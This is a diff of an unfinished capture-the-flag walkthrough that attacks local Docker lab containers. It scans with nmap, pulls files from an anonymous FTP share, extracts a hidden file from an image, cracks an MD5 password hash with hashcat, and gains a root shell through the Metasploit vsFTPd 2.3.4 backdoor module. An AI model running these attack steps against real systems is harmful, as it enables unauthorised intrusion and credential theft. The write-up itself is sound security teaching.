@@ -1,6 +1,18 @@
 
 ---
 
+> IMPORTANT:
+> 	This write up is incomplete. All of the steps and a majority of the explanations are there, however more work remains to be done both on the Docker containers and this writeup itself.
+> 	
+> 	Any questions, comments, or other inquiries can be directed to any of the following contacts:
+> 		- Email: raykhelson.ielon@gmail.com
+> 		- Direct Message me via Discord: `thesillygoose.`
+> 		- Send a message in the Cyber Lions Discord: https://discord.gg/csxvHzpbNy
+> 		- Issue/Pull request via Github: https://github.com/0x7070/CTF_writeup
+> 		  
+> 	If at any point you are stuck in the CTF, please do not hesitate to reach out. I will be happy to help step you through the challenge.
+
+
 # Version Info
 ``` bash
 # Kali OS [b] - Running from a VirtualBox VM hosted on Ubuntu version [a]
@@ -41,17 +53,44 @@ BUG_REPORT_URL="https://bugs.kali.org/"
 ANSI_COLOR="1;31"
 
 # Docker version
-kali:~$ docker --version
+$ docker --version
 Docker version 26.1.5+dfsg1, build a72d7cd
 
 # Firefox version
-# Dirbuster version
-# ImageMagick version (display --version)
-# Exiftool (exiftool -ver)
-# hexdump
-# binwalk
-# hash-identifier
+$ firefox --version
+Mozilla Firefox 128.5.0esr
 
+# Dirbuster version
+$ dirbuster --help
+DirBuster - 1.0-RC1
+
+# ImageMagick version (display --version)
+$ display --version
+Version: ImageMagick 6.9.13-12 Q16 x86_64 18420 https://legacy.imagemagick.org
+
+# Exiftool (exiftool -ver)
+$ exiftool -ver
+13.00
+
+# hexdump
+$ hexdump --version    
+hexdump from util-linux 2.40.2
+
+# binwalk
+$ binwalk --help   
+Binwalk v2.4.3
+
+# hash-identifier
+$ apt show hash-identifier
+Version: 1.2+git20180314-0kali3
+
+# hachcat version
+$ hashcat --version
+v6.2.6
+
+# metasploit / searchsploit version (both are packaged into `exploitdb`)
+$ apt show exploitdb
+Version: 20241116-0kali1
 ```
 
 # 1. Initialize and configure Docker containers
@@ -62,17 +101,17 @@ Docker version 26.1.5+dfsg1, build a72d7cd
 # (a)
 # docker --version
 # (b)
-# sudo apt install docker -y
+# sudo apt install docker.io -y
 
 # pull Docker images
-sudo docker pull professorprofessional/cyberlions-vsftpd234:v1.0
-sudo docker pull professorprofessional/cyberlions-apache2:v1.0
+sudo docker pull professorprofessional/cyberlions-vsftpd234:v2
+sudo docker pull professorprofessional/cyberlions-apache2:v3
 ```
 
 Should see a successful output for both:
 ``` bash
 ┌──(kali㉿kali)-[~]
-└─$ sudo docker pull professorprofessional/cyberlions-vsftpd234:v1.0
+└─$ sudo docker pull professorprofessional/cyberlions-vsftpd234:v2
 v1.0: Pulling from professorprofessional/cyberlions-vsftpd234
 d9802f032d67: Pull complete 
 41b8fe7cdfd1: Pull complete 
@@ -86,11 +125,11 @@ e535bced3036: Pull complete
 c6c2452d5fe4: Pull complete 
 c6382b3ba332: Pull complete 
 Digest: sha256:50a819e7a69eacfb456c7055240acb20ecc2f10542024cc41addc65f88ac47c9
-Status: Downloaded newer image for professorprofessional/cyberlions-vsftpd234:v1.0
-docker.io/professorprofessional/cyberlions-vsftpd234:v1.0
+Status: Downloaded newer image for professorprofessional/cyberlions-vsftpd234:v2
+docker.io/professorprofessional/cyberlions-vsftpd234:v2
 
 ┌──(kali㉿kali)-[~]
-└─$ sudo docker pull professorprofessional/cyberlions-apache2:v1.0  
+└─$ sudo docker pull professorprofessional/cyberlions-apache2:v3  
 v1.0: Pulling from professorprofessional/cyberlions-apache2
 d9802f032d67: Already exists 
 48beede29b25: Pull complete 
@@ -102,8 +141,8 @@ ba5a913d3f4a: Pull complete
 8e1906eea38f: Pull complete 
 62c0327efd8e: Pull complete 
 Digest: sha256:0158274f91710dfae81f953d9319716c6277ed15ca79287eb7c512c674506ab2
-Status: Downloaded newer image for professorprofessional/cyberlions-apache2:v1.0
-docker.io/professorprofessional/cyberlions-apache2:v1.0
+Status: Downloaded newer image for professorprofessional/cyberlions-apache2:v3
+docker.io/professorprofessional/cyberlions-apache2:v3
 ```
 
 You'll see "already exists" as the containers are built using the same Ubuntu base image, which you'd already have downloaded with the first image
@@ -117,12 +156,15 @@ professorprofessional/cyberlions-apache2     v1.0      d5d167c50eaa   5 days ago
 professorprofessional/cyberlions-vsftpd234   v1.0      50178d3c26d7   5 days ago   385MB
 ```
 
-==Explain these==
 ``` bash
 sudo docker rmi {iid}
 sudo docker kill {cid}
 sudo docker remove {cid}
 ```
+
+> rmi : remove image (image_id)
+> kill : kill an active container (container_id)
+> remove : remove a container (container_id)
 
 ### 1b. Spin up Docker containers
 
@@ -131,38 +173,31 @@ Verify nothing is running on ports 20,21,80
 ss | grep -w -e '20' -e '21' -e '80'
 ```
 
-If there are open ports that **are not** a essential to the current session, terminate them, then re-verify
+If there are services active on these ports, terminate them, then re-verify
 ``` bash
 sudo kill -9 {pid},{pid},...
 ```
 
-If open ports **are** essential to the current session, follow option 2. 
-
-Option 1:
+Once no services are running on these ports, spin up the containers 
 ```
 # spin up Docker containers with default configuration
 ┌──(kali㉿kali)-[~]
-└─$ sudo docker run -d -p 80:80 professorprofessional/cyberlions-apache2:v1.0
+└─$ sudo docker run -d -p 80:80 professorprofessional/cyberlions-apache2:v3
 ┌──(kali㉿kali)-[~]
-└─$ sudo docker run -d -p 20:20 -p 21:21 professorprofessional/cyberlions-vsftpd234:v1.0
-```
-
-Option 2: ==find a method to use other ports==
-``` bash
-# spin up Docker containers
+└─$ sudo docker run -d -p 20:20 -p 21:21 professorprofessional/cyberlions-vsftpd234:v2
 ```
 
 > IMPORTANT: the order in which you run your Docker containers will dictate what services are running at which IP addresses. For this write up, it is assumed that your containers are ran in the same order as mine.
 
-You'll see container IDs if they have been ==spun up (DEFINE)==. This does not always mean a container has been successfully initialized, however -- though there may not have been any errors printed during executing, there may still be issues with configuration.
+You'll see container IDs if they have been. This does not always mean a container has been successfully initialized, however -- though there may not have been any errors printed during executing, there may still be issues with configuration.
 
 Verify the containers have successfully been initialized
 ``` bash
 ┌──(kali㉿kali)-[~]
 └─$ sudo docker ps -a                                                                   
 CONTAINER ID   IMAGE                                             COMMAND                  CREATED              STATUS              PORTS                                           NAMES
-cf452852d471   professorprofessional/cyberlions-vsftpd234:v1.0   "/usr/local/sbin/vsf…"   About a minute ago   Up About a minute   0.0.0.0:20-21->20-21/tcp, :::20-21->20-21/tcp   competent_blackburn
-332ee0e1fc2d   professorprofessional/cyberlions-apache2:v1.0     "apache2ctl -D FOREG…"   2 minutes ago        Up 2 minutes        0.0.0.0:80->80/tcp, :::80->80/tcp               pensive_chatterjee
+cf452852d471   professorprofessional/cyberlions-vsftpd234:v2   "/usr/local/sbin/vsf…"   About a minute ago   Up About a minute   0.0.0.0:20-21->20-21/tcp, :::20-21->20-21/tcp   competent_blackburn
+332ee0e1fc2d   professorprofessional/cyberlions-apache2:v3     "apache2ctl -D FOREG…"   2 minutes ago        Up 2 minutes        0.0.0.0:80->80/tcp, :::80->80/tcp               pensive_chatterjee
 ```
 We're looking for the "up ..." in the "STATUS" column. Anything else will give us functionality issues if unintentionally set to that. 
 
@@ -326,7 +361,9 @@ MAC Address: 02:42:AC:11:00:03 (Unknown)
 Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
 ```
 
-==specify why we only use 21 not 20 anymore==
+> If you are paying close attention, you might have noticed we have stopped working with port `20`. 
+> For this CTF, probing port `20` is not necessary, as it is only open situationally. 
+
 Again, this doesn't tell us much. Let's proceed with the same noisy scan from earlier, substituting `-p 80` for `-p 21`:
 ```
 ┌──(kali㉿kali)-[~]
@@ -362,8 +399,6 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
 ```
 That's a lot of information! Ignoring the details of the output, we can assume the following network topology, excluding the topology preceding our Kali attack machine, as that is user-dependent.
-
-==make diagram==
 
 ```
 ┌─Kali Attack
@@ -459,7 +494,7 @@ Let's analyze these hashes.
 
 In the first column (delimited by the colon `:`), we can assume these are usernames. In the second column, thanks to the hash identifier `$2y$`, we have what looks to be password hashes.
 
-By doing some research, we can positively identify these hashes as an iteration of the bcrypt hashing algorithm. ==more information can be found here==. time to crack (https://specopssoft.com/blog/hashing-algorithm-cracking-bcrypt-passwords/) Furthermore, given the complexity of a possible password, we can conclude that cracking these hashes is unrealistic, as seen in this time-to-crack table. Again, we can return to this later if need be. 
+By doing some research, we can positively identify these hashes as an iteration of the bcrypt hashing algorithm. More information can be found [here](https://en.wikipedia.org/wiki/Bcrypt). time to crack  Furthermore, given the complexity of a possible password, we can conclude that cracking these hashes is unrealistic, as seen in this [time-to-crack table](https://specopssoft.com/blog/hashing-algorithm-cracking-bcrypt-passwords/). Again, we can return to this later if need be. 
 
 For now, we will proceed to the other node on this network.
 
@@ -485,8 +520,6 @@ For this approach, we'll opt for the GUI, as it is more user friendly, and provi
 ![kali menu](resources/menu.png)
 
 ![kali menu dirbuster](resources/menu_dirbuster.png)
-
-==add arrow icons==
 
 Either method will open the an identical Dirbuster GUI.
 
@@ -514,7 +547,7 @@ Still, let's explore another potential configuration.
 The attack we previously performed -- a pure brute force attack -- generates combinations using iterations of characters. 
 
 > For example: Let's lay out the following scenario.
-> We have obtained access to a ==jailbroken== iPhone which, dissimilar to it's intended functionality, does not lock itself when too many incorrect pin combinations have been entered. 
+> We have obtained access to a jailbroken iPhone which, dissimilar to it's intended functionality, does not lock itself when too many incorrect pin combinations have been entered. 
 > Because of this, we are able to freely guess the pin combination as many times as we would like until we are granted access. We know the pin is 6 digits, allowing us to try each combination iteratively until we have guessed correctly. 
 > In practice, this would look something like:
 > 000000, 000001, 000010, 000100, 001000, 010000, 100000, etc...
@@ -562,8 +595,6 @@ Once you feel satisfied with the results, you can navigate to `Results - List Vi
 
 Using this wordlist, we have uncovered some more information.
 
-==crop the top==
-
 ![tree view dirbuster](resources/tree_dirbuster.png)
 
 The response codes indicate what default permissions are designated to the corresponding path.
@@ -579,7 +610,7 @@ As the response codes indicate, there is nothing we can access here that we have
 Quit Dirbuster, and proceed to the next step.
 
 ---
-# 4. Assess the vsFTPd server 
+# 4. Probe the vsFTPd server 
 
 ### 4a. Understanding the `nmap` output
 
@@ -694,8 +725,8 @@ pass: {anything}
 
 ``` bash
 ┌──(kali㉿kali)-[~]
-└─$ ftp 172.17.0.2           
-Connected to 172.17.0.2.
+└─$ ftp 172.17.0.3           
+Connected to 172.17.0.3.
 220 (vsFTPd 2.3.4)
 Name (172.17.0.2:kali): ftp
 331 Please specify the password.
@@ -720,7 +751,12 @@ drwxrwxr--    3 1002     1002         4096 Dec 04 15:46 franklin
 226 Directory send OK.
 ```
 
-Again, we see permissions, which indicate that the only anonymously accessible files are `key.png` and `lock.png`, as the `other` permission set ==explain that== is e[`x`]ecutable (`r-x`). This means that anyone is able to perform commands on the file.
+Again, we see permissions, which indicate that the only anonymously accessible files are `key.png` and `lock.png`, as the `other` permission set is e[`x`]ecutable (`r-x`). This means that anyone is able to perform commands on the file.
+
+> Permission sets:
+> (filetype)(owner)(group)(other)
+> (d/-)(rwx)(rwx)(rwx)
+
 
 Use `get` to download the files from the server.
 ```
@@ -809,12 +845,11 @@ Color Type                      : RGB with Alpha
 Compression                     : Deflate/Inflate
 Filter                          : Adaptive
 Interlace                       : Noninterlaced
-Description                     : Trash comes on Friday's in some neighborhoods... I sure would hate to have to WALK my BIN back inside on a Friday.
 Image Size                      : 626x501
 Megapixels                      : 0.314
 ```
 
-Here, we see many different categories. Of these, `Description` seems to stand out. `"Trash comes on Friday's in some neighborhoods... I sure would hate to have to WALK my BIN back inside on a Friday"`. Hmm... I wonder what this could mean! 
+Here, we see many different categories. Of these, none seem to stand out. 
 
 Let's check out `lock.png` and see if we can uncover any other information.
 
@@ -908,7 +943,7 @@ Looking at the first line of output, we see our 8-bit hexadecimal string, `89 50
 
 `[minor] Trailer data after PNG IEND chunk` indicates an excess of data, but where is it?
 
-==PNG file structure== https://www.w3.org/TR/PNG-Structure.html
+> You can learn more about PNG file structure [here](https://www.w3.org/TR/PNG-Structure.html)
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -940,10 +975,9 @@ The presence of two `IHDR`'s and two `IEND`'s suggest the existence of another `
 
 ### 4c-d. Extracting embedded files using `binwalk`
 
-==explain further==
-Binwalk is a tool which rebuilds data using strings of, in this case, logically related hexadecimal (i.e hexadecimal within `IHDR` and `IEND`).
+Simply, `binwalk` is a tool which rebuilds data using strings of, in this case, logically related hexadecimal (i.e hexadecimal within `IHDR` and `IEND`).
 
-==explain command=
+> (dd -> delimiter -- in this case, pull all (`*`) possible file signatures and save them as their recognized type)
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -997,6 +1031,8 @@ Using binary mode to transfer files.
 ```
 
 Great! Let's look around.
+
+> IMPORTANT: You'll see a `hash.txt` in the root directory -- don't look at it. I forgot to remove it!
 
 ```
 ftp> ls
@@ -1081,15 +1117,779 @@ After getting it from the server, we can view its contents.
 └─$ cat .quiet                         
 youtube:franky:73e77203ad07cd155aa0b9e8e45100a2049006b6
 gmail:franklin01@gmail.com:9bf0525826f868a09a715836f2e7c62a6a18e614
-svssl:franklin:2597fa0ba3c99e391c928236e4c6801ccae8087c
+svssl:franklin:9a9f75c7bf95c80832d02d572059a4d0
 steam:franklyHIM:b1ccd9b1cf8c20a5d028d6ea74ff2455ccb17e52
 ftp:franklin:2597fa0ba3c99e391c928236e4c6801ccae8087c
 ```
 
 It looks like `.quiet` contained password hashes. As the password hashes seem relatively simple, using `hash-identifier`, we can try to identify these hashes.
 
+As we found on the HTTP server, we are dealing with a login portal: "So Super Very Secure Login Page" -- as such, "svssl" is of interest here.
+
 ```
-s
+┌──(kali㉿kali)-[~]
+└─$ hash-identifier "9a9f75c7bf95c80832d02d572059a4d0"
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+
+Possible Hashs:
+[+] MD5
+[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+
+Least Possible Hashs:
+[+] RAdmin v2.x
+[+] NTLM
+[+] MD4
+[+] MD2
+[+] MD5(HMAC)
+[+] MD4(HMAC)
+[+] MD2(HMAC)
+[+] MD5(HMAC(Wordpress))
+[+] Haval-128
+[+] Haval-128(HMAC)
+[+] RipeMD-128
+[+] RipeMD-128(HMAC)
+[+] SNEFRU-128
+[+] SNEFRU-128(HMAC)
+[+] Tiger-128
+[+] Tiger-128(HMAC)
+[+] md5($pass.$salt)
+[+] md5($salt.$pass)
+[+] md5($salt.$pass.$salt)
+[+] md5($salt.$pass.$username)
+[+] md5($salt.md5($pass))
+[+] md5($salt.md5($pass))
+[+] md5($salt.md5($pass.$salt))
+[+] md5($salt.md5($pass.$salt))
+[+] md5($salt.md5($salt.$pass))
+[+] md5($salt.md5(md5($pass).$salt))
+[+] md5($username.0.$pass)
+[+] md5($username.LF.$pass)
+[+] md5($username.md5($pass).$salt)
+[+] md5(md5($pass))
+[+] md5(md5($pass).$salt)
+[+] md5(md5($pass).md5($salt))
+[+] md5(md5($salt).$pass)
+[+] md5(md5($salt).md5($pass))
+[+] md5(md5($username.$pass).$salt)
+[+] md5(md5(md5($pass)))
+[+] md5(md5(md5(md5($pass))))
+[+] md5(md5(md5(md5(md5($pass)))))
+[+] md5(sha1($pass))
+[+] md5(sha1(md5($pass)))
+[+] md5(sha1(md5(sha1($pass))))
+[+] md5(strtoupper(md5($pass)))
+--------------------------------------------------
+ HASH:  
 ```
 
-make new hashes md5
+Awesome! Our hash is recognized as an MD5 hash -- luckily, it seems unsalted. This will be easy!
+
+# 6. Password cracking using Hashcat
+
+## 6a-a. Getting the `rockyou` wordlist
+
+Like the Dirbuster attack earlier, we are going to be using a dictionary attack. So, we will need a list of or a single hash (we'll be using a single hash), a wordlist to iterate, and possibly a ruleset.
+
+For this attack, we will use a dictionary commonly utilized in CTFs -- `rockyou.txt`.
+
+Thankfully, Kali saves us the trouble of importing this wordlist ourselves. 
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
+```
+
+>-d -> decompress
+>-k -> keep original archive
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo mv /usr/share/wordlists/rockyou.txt .
+```
+
+We'll move this to our current working directory (`.`)
+
+Now that we have made it accessible, we need the hash.
+
+## 6a-b. Getting the MD5 hash
+
+Since we're only interested in a single hash from the list of hashes, we can do a simple copy and paste (hash from the output of the list -> hashcat command)
+
+> On Debian-based systems within the terminal: copy [CTRL+SHIFT+C], paste [CTRL+SHIFT+P]
+
+```
+┌──(kali㉿kali)-[~]
+└─$ cat quiet
+youtube:franky:73e77203ad07cd155aa0b9e8e45100a2049006b6
+gmail:franklin01@gmail.com:9bf0525826f868a09a715836f2e7c62a6a18e614
+svssl:franklin:9a9f75c7bf95c80832d02d572059a4d0
+steam:franklyHIM:b1ccd9b1cf8c20a5d028d6ea74ff2455ccb17e52
+ftp:franklin:2597fa0ba3c99e391c928236e4c6801ccae8087c
+```
+
+Here, we'll grab the `svssl` hash -- `9a9f75c7bf95c80832d02d572059a4d0`
+
+## 6b-a. Cracking the MD5 hash - getting arguments
+
+Now, we are ready to use hashcat.
+
+For this attack, there are two arguments we need to configure -- `-m` and `-a`.
+
+We can learn more about these using `--help`.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ hashcat --help | grep -w -- "-a"
+ -a, --attack-mode              | Num  | Attack-mode, see references below                    | -a 3
+  Wordlist         | $P$   | hashcat -a 0 -m 400 example400.hash example.dict
+  Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
+  Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
+  Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict
+  Association      | $1$   | hashcat -a 9 -m 500 example500.hash 1word.dict -r rules/best64.rule
+
+┌──(kali㉿kali)-[~]
+└─$ hashcat --help | grep -w -- "-m"
+ -m, --hash-type                | Num  | Hash-type, references below (otherwise autodetect)   | -m 1000
+  Wordlist         | $P$   | hashcat -a 0 -m 400 example400.hash example.dict
+  Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
+  Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
+  Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict
+  Association      | $1$   | hashcat -a 9 -m 500 example500.hash 1word.dict -r rules/best64.rule
+```
+
+As we see, we need to know the attack mode and the hash type. 
+
+Starting with the hash type `-m`, we can find this with another `--help` search. 
+
+```
+┌──(kali㉿kali)-[~]
+└─$ hashcat --help | grep -w "MD5"   
+      0 | MD5                                                        | Raw Hash
+	...
+```
+
+On the left, we see the hash code we will be passing to `-m`. On the right is the hash type it is representing.
+
+Next, we will need the attack type. 
+
+Again, `hashcat --help` can be used here. 
+
+Scrolling up, we can see a list of `- [ Attack Modes ] -`
+
+```
+- [ Attack Modes ] -
+
+  # | Mode
+ ===+======
+  0 | Straight
+  1 | Combination
+  3 | Brute-force
+  6 | Hybrid Wordlist + Mask
+  7 | Hybrid Mask + Wordlist
+  9 | Association
+```
+
+We will be using mode `0`, `straight`, which represents a wordlist attack.
+
+## 6b-b. Cracking the MD5 hash
+
+At this point, we have decided our attack mode, hash type, wordlist, and defined the hash we are going to be targeting. 
+
+Let's crack it.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ hashcat -m 0 -a 0 "9a9f75c7bf95c80832d02d572059a4d0" rockyou.txt -o cracked.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-haswell-AMD Ryzen 5 5600X 6-Core Processor, 2918/5900 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache built:
+* Filename..: rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 9a9f75c7bf95c80832d02d572059a4d0
+Time.Started.....: Fri Dec 20 00:39:30 2024 (0 secs)
+Time.Estimated...: Fri Dec 20 00:39:30 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  6594.1 kH/s (0.08ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 1796096/14344385 (12.52%)
+Rejected.........: 0/1796096 (0.00%)
+Restore.Point....: 1794048/14344385 (12.51%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: freckles16 -> founda
+Hardware.Mon.#1..: Util: 25%
+
+Started: Fri Dec 20 00:39:12 2024
+Stopped: Fri Dec 20 00:39:31 2024
+```
+
+This shouldn't take too long. I've added an additional argument, `-o`, which specifies an output path for the cracked credentials. If this path is not present, hashcat will create it (given it has permissions to do so).
+
+## 6b-c. Accessing the credentials
+
+There are many ways to view cracked credentials with hashcat. We've chosen to specify an output file, which we can open as we would any other text file.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ cat cracked.txt 
+9a9f75c7bf95c80832d02d572059a4d0:fr4nkl1n
+```
+
+Great. Let's try this on the login portal.
+
+# 7. Accessing SVSSL
+
+If needed, navigate to `http://172.17.0.2:80/`.
+
+Using the following credentials,
+
+```
+franklin
+fr4nkl1n
+```
+
+We are given our first flag. Save this for later!
+
+> Do not close the tab, as you will need it for flag verification after the event.
+
+---
+
+Still, we have yet to find the credentials to the other account.
+
+# 8. Metasploit and vsFTPd
+
+From our scan earlier, thanks to the `-sV` flag, we know we are dealing with a vsFTPd server running version 2.3.4:
+
+``` 
+┌──(kali㉿kali)-[~]
+└─$ nmap -sC -sV -p 21 172.17.0.3
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-11 02:54 EST
+Nmap scan report for 172.17.0.3
+Host is up (0.000030s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 172.17.0.1
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxrwxr--    4 1001     1001         4096 Dec 04 15:46 beary
+| drwxrwxr--    3 1002     1002         4096 Dec 04 15:46 franklin
+| -rwxrwxr-x    1 0        0          134881 Dec 04 02:41 key.png
+|_-rwxrwxr-x    1 0        0          689793 Dec 04 02:41 lock.png
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
+```
+
+We can search for known vulnerabilities to take advantage of.
+
+## 8a. Searching for vulnerabilities using `searchsploit`
+
+`Metasploit` -- a framework designed for the storage, retrieval, and execution of common exploits.
+
+A tool provided by Kali, `searchsploit`, helps us easily identify vulnerabilities supported by metasploit.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ searchsploit vsftpd 2.3.4                                                
+--- 
+Exploit Title |  Path
+vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb
+---
+Shellcodes: No Results
+```
+
+Perfect -- metasploit supports a backdoor command execution exploit. If successful, this will allow us root level access into the FTP server, allowing us to freely traverse the system. 
+
+# 8b. Using `metasploit`
+
+## 8b-a. Load the `metasploit` console
+
+Using `msfconsole`, we can access `metasploit`.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ msfconsole
+...
+msf6 > 
+```
+
+> In between `msfconsole` and `msf# >` you will see text indicating it's starting up
+
+## 8b-b. Find the exploit path
+
+Similar to before, we can query the metasploit database for known vsftpd 2.3.4 exploits -- this time, we'll see a path containing the exploit we'll use.
+
+```
+msf6 > search vsftpd 2.3.4
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+## 8b-c. Select the exploit path
+
+```
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor 
+[*] No payload configured, defaulting to cmd/unix/interact
+```
+
+`No payload configured` is no a concern to us for this specific attack.
+
+## 8b-d. Configure the exploit
+
+Using `options`, we can see which settings are Required (`yes`), and which are not (`no`). 
+
+```
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+```
+
+Here, we see `RHOSTS` and `RPORT` are required.
+
+> When using metasploit, you will often see L... and R... -- L commonly refers to the attacker, whereas R commonly refers to the target.
+
+We will use `set` to configure these settings:
+
+```
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.17.0.3
+RHOSTS => 172.17.0.3
+```
+
+Now, we are ready to use the exploit.
+
+## 8c. Perform the exploit
+
+Using `exploit`, we can run our attack.
+
+```
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 172.17.0.3:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 172.17.0.3:21 - USER: 331 Please specify the password.
+[+] 172.17.0.3:21 - Backdoor service has been spawned, handling...
+[+] 172.17.0.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (172.17.0.1:35421 -> 172.17.0.3:6200) at 2024-12-20 01:12:48 -0500
+```
+
+If successful, you will see a similar output, with your individual topology details rather than mine (if they are different).
+
+However, you will not see a shell indicator (`#` or `$`). Instead, you will be given a blank line to perform your commands.
+
+## 8d-a. Locating the FTP server
+
+> Important: 
+> - If you have an error when executing commands, you may not see it
+> - Some commands may not be present
+
+> Important: For clarity, I will be adding my own shell indicator `>`. Input will begin with a `>`, whereas output will not have an indicator.
+
+A simple `whoami` will verify that we are indeed `root`.
+
+```
+> whoami       
+root
+```
+
+Furthermore, `pwd` will show us where we are currently at within the system.
+```
+> pwd
+/
+```
+
+Using `ls`, we can see that we are not within the ftp server.
+```
+> ls
+ls
+bin
+boot
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+```
+
+Often, FTP servers can be found at a path similar to `/var/ftp`. We can find this ourselves though using `find`. 
+
+> The syntax of `find` for our specific search : `find <where_to_search> -name`
+
+> We will send the error output (`2`) to `/dev/null` (similar to trash) so that we only see valid paths. This is optional, as this shell may not send error output depending on your configuration.
+
+```
+> find / -name ftp 2>/dev/null
+/usr/lib/apt/methods/ftp
+/var/ftp
+```
+
+As we thought, the FTP server is located at `/var/ftp` -- let's go there.
+
+## 8d-b. Navigating the FTP server
+
+```
+> cd /var/ftp
+> ls -la
+total 828
+dr-xr-xr-x 4 ftp      ftp        4096 Dec 13 02:41 .
+drwxr-xr-x 1 root     root       4096 Dec 13 02:41 ..
+drwxrwxr-- 4 beary    beary      4096 Dec 13 02:41 beary
+drwxrwxr-- 3 franklin franklin   4096 Dec 13 02:41 franklin
+-rwxrwxr-x 1 root     root     134743 Dec 13 00:55 key.png
+-rwxrwxr-x 1 root     root     689793 Dec  4 02:41 lock.png
+```
+
+After changing to the directory, we can begin searching through the `beary` directory.
